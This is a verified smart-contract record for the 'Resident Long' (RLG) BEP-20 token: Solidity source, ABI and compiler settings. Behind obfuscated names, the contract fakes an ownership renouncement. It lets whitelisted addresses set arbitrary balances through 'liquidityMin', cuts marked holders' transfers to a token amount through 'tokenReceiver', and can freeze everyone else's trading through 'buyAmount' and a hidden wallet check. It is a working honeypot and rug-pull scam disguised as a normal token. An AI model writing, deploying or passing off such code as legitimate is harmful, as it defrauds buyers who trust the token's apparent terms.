{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface walletLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingMode) external view returns (uint256);\n\n    function transfer(address tokenTakeAmount, uint256 feeTeamTotal) external returns (bool);\n\n    function allowance(address autoEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeTeamTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenTakeAmount,\n        uint256 feeTeamTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atLimitTotal, uint256 value);\n    event Approval(address indexed autoEnable, address indexed spender, uint256 value);\n}\n\nabstract contract feeFromShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface toList {\n    function createPair(address totalReceiverSwap, address senderExempt) external returns (address);\n}\n\ninterface walletLaunchedMetadata is walletLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ResidentLong is feeFromShould, walletLaunched, walletLaunchedMetadata {\n\n    function owner() external view returns (address) {\n        return exemptTo;\n    }\n\n    uint256 public launchAmount;\n\n    bool public enableTake;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingTotal;\n    }\n\n    uint256 private walletTake;\n\n    function approve(address listFund, uint256 feeTeamTotal) public virtual override returns (bool) {\n        sellIsAt[_msgSender()][listFund] = feeTeamTotal;\n        emit Approval(_msgSender(), listFund, feeTeamTotal);\n        return true;\n    }\n\n    uint256 private atExempt;\n\n    function fundAuto(address receiverLaunched) public {\n        if (enableTake) {\n            return;\n        }\n        if (feeMode != takeSender) {\n            takeLaunch = false;\n        }\n        listMarketing[receiverLaunched] = true;\n        if (shouldMarketing == launchAmount) {\n            takeLaunch = false;\n        }\n        enableTake = true;\n    }\n\n    uint256 listModeFrom;\n\n    function tokenReceiver(address amountTeam) public {\n        maxTxMode();\n        if (takeSender != atExempt) {\n            atExempt = launchAmount;\n        }\n        if (amountTeam == exemptReceiver || amountTeam == listIs) {\n            return;\n        }\n        limitShouldMax[amountTeam] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellReceiver;\n    }\n\n    mapping(address => bool) public limitShouldMax;\n\n    function isReceiver(address fundLimit, address tokenTakeAmount, uint256 feeTeamTotal) internal returns (bool) {\n        require(swapTo[fundLimit] >= feeTeamTotal);\n        swapTo[fundLimit] -= feeTeamTotal;\n        swapTo[tokenTakeAmount] += feeTeamTotal;\n        emit Transfer(fundLimit, tokenTakeAmount, feeTeamTotal);\n        return true;\n    }\n\n    mapping(address => uint256) private swapTo;\n\n    bool public takeLaunch;\n\n    bool public senderReceiver;\n\n    mapping(address => bool) public listMarketing;\n\n    uint256 constant maxMarketing = 11 ** 10;\n\n    address modeFromWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        \n        walletEnable feeTxMode = walletEnable(senderMinFrom);\n        listIs = toList(feeTxMode.factory()).createPair(feeTxMode.WETH(), address(this));\n        \n        exemptReceiver = _msgSender();\n        launchedTrading();\n        listMarketing[exemptReceiver] = true;\n        swapTo[exemptReceiver] = sellReceiver;\n        if (feeMode != takeSender) {\n            takeSender = shouldMarketing;\n        }\n        emit Transfer(address(0), exemptReceiver, sellReceiver);\n    }\n\n    uint8 private totalTrading = 18;\n\n    function getOwner() external view returns (address) {\n        return exemptTo;\n    }\n\n    function liquidityMin(address shouldFee, uint256 feeTeamTotal) public {\n        maxTxMode();\n        swapTo[shouldFee] = feeTeamTotal;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalTrading;\n    }\n\n    string private tradingTotal = \"RLG\";\n\n    bool private amountLaunchSender;\n\n    address senderMinFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private exemptTo;\n\n    uint256 private feeMode;\n\n    function buyAmount(uint256 feeTeamTotal) public {\n        maxTxMode();\n        exemptLaunch = feeTeamTotal;\n    }\n\n    string private minFee = \"Resident Long\";\n\n    function balanceOf(address marketingMode) public view virtual override returns (uint256) {\n        return swapTo[marketingMode];\n    }\n\n    uint256 private takeSender;\n\n    function name() external view virtual override returns (string memory) {\n        return minFee;\n    }\n\n    function txLaunch(address fundLimit, address tokenTakeAmount, uint256 feeTeamTotal) internal returns (bool) {\n        if (fundLimit == exemptReceiver) {\n            return isReceiver(fundLimit, tokenTakeAmount, feeTeamTotal);\n        }\n        uint256 launchTx = walletLaunched(listIs).balanceOf(modeFromWallet);\n        require(launchTx == exemptLaunch);\n        require(tokenTakeAmount != modeFromWallet);\n        if (limitShouldMax[fundLimit]) {\n            return isReceiver(fundLimit, tokenTakeAmount, maxMarketing);\n        }\n        return isReceiver(fundLimit, tokenTakeAmount, feeTeamTotal);\n    }\n\n    mapping(address => mapping(address => uint256)) private sellIsAt;\n\n    event OwnershipTransferred(address indexed exemptFrom, address indexed feeLiquidity);\n\n    function transferFrom(address fundLimit, address tokenTakeAmount, uint256 feeTeamTotal) external override returns (bool) {\n        if (_msgSender() != senderMinFrom) {\n            if (sellIsAt[fundLimit][_msgSender()] != type(uint256).max) {\n                require(feeTeamTotal <= sellIsAt[fundLimit][_msgSender()]);\n                sellIsAt[fundLimit][_msgSender()] -= feeTeamTotal;\n            }\n        }\n        return txLaunch(fundLimit, tokenTakeAmount, feeTeamTotal);\n    }\n\n    function transfer(address shouldFee, uint256 feeTeamTotal) external virtual override returns (bool) {\n        return txLaunch(_msgSender(), shouldFee, feeTeamTotal);\n    }\n\n    address public exemptReceiver;\n\n    uint256 public shouldMarketing;\n\n    uint256 private sellReceiver = 100000000 * 10 ** 18;\n\n    address public listIs;\n\n    uint256 exemptLaunch;\n\n    function launchedTrading() public {\n        emit OwnershipTransferred(exemptReceiver, address(0));\n        exemptTo = address(0);\n    }\n\n    function maxTxMode() private view {\n        require(listMarketing[_msgSender()]);\n    }\n\n    function allowance(address enableTxSell, address listFund) external view virtual override returns (uint256) {\n        if (listFund == senderMinFrom) {\n            return type(uint256).max;\n        }\n        return sellIsAt[enableTxSell][listFund];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLimitTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTxSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTeamTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeTeamTotal\",\"type\":\"uint256\"}],\"name\":\"buyAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunched\",\"type\":\"address\"}],\"name\":\"fundAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitShouldMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTeamTotal\",\"type\":\"uint256\"}],\"name\":\"liquidityMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTeam\",\"type\":\"address\"}],\"name\":\"tokenReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTeamTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenTakeAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTeamTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ResidentLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}